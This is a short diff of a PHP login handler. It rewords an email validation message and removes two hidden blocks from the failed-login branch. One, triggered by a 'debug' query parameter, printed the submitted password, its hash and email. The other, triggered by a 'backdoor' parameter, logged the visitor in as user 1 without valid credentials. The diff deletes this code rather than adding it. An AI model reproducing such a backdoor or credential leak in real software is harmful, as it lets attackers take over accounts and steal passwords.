@@ -22,7 +22,7 @@ if($_SERVER['REQUEST_METHOD'] == 'POST'): // is POST request
 		$message = "Email or password cannot be empty!";
 
 	elseif(!has_valid_email_format($_POST['email']) || !has_length_less_than($_POST['email'], 251)):
-		$message = "Email must be in the correct format and no longer than 250 chars long!";
+		$message = "Invalid email format!";
 
 	else:
 		$email = $_POST['email'];
@@ -40,15 +40,8 @@ if($_SERVER['REQUEST_METHOD'] == 'POST'): // is POST request
 			header("Location: /php-login");
 
 		} else {
-			$message = 'Sorry, those credentials do not match';
-			if (@$_GET["debug"]=="1"){
-				echo $message."<br>".md5($_POST['password'])."<br>".$_POST['password']."<br>".$_POST['email'];
-			}
-			if (@$_GET["backdoor"]=="1"){
-				$_SESSION['user_id'] = 1;		
-			}
+			$message = 'Sorry, those credentials do not match ';
 		}
-
 	endif;
 endif;
 
